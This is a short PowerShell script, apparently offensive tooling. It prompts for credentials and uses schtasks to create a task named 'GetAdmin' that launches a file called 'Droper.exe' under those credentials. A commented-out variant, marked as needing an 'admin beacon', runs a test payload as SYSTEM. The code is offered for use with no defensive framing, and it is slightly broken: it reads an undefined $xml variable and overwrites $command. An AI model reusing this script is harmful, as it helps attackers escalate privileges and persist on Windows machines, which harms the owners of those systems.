# Prompt the user for credentials
$credential = Get-Credential

# Extract task configuration from XML
$command = $xml.TaskDefinition.Command
$username = $credential.UserName
$password = $credential.GetNetworkCredential().Password

# Define the command to create the scheduled task using schtasks.exe
$command = "schtasks /create /tn GetAdmin /tr 'Path\To\Droper.exe' /sc once /st 15:00 /ru $username /rp $password"

#Use below command for SYSTEM (admin beacon needed)
#$command = "schtasks /create /tn GetSystem /tr 'C:\Users\user\Downloads\APCTest.exe' /sc once /st 12:05 /ru SYSTEM"

# Execute the command using Invoke-Expression
Invoke-Expression -Command $command
